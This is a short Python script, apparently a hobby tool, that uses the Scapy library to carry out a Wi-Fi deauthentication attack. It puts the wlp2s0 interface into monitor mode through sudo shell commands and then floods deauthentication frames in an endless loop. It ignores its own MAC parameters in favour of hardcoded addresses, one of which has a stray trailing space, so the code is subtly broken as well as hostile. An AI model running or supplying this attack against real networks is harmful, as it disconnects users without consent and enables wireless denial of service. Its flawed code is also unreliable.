from scapy.layers.dot11 import RadioTap, Dot11, Dot11Deauth
from scapy.sendrecv import *
import os,sys

class scapy_scapy:


    def deauth(self, mac, target_mac):
        mac = str(mac)
        target_mac = str(target_mac)
        pkt  = RadioTap() / Dot11(addr1 = '0c:ee:e6:9d:e9:a4 ', addr2 = "04:D1:3A:27:70:4B" , addr3 = "04:D1:3A:27:70:4B") / Dot11Deauth(reason = 2 )

        os.system('sudo ifconfig wlp2s0 down')
        os.system('sudo iwconfig wlp2s0 mode monitor')
        os.system('sudo ifconfig wlp2s0 up')
        while True:
            try:
                sendp(pkt, iface = 'wlp2s0' , verbose = False)
            except:
                print("Client down")
                sys.exit()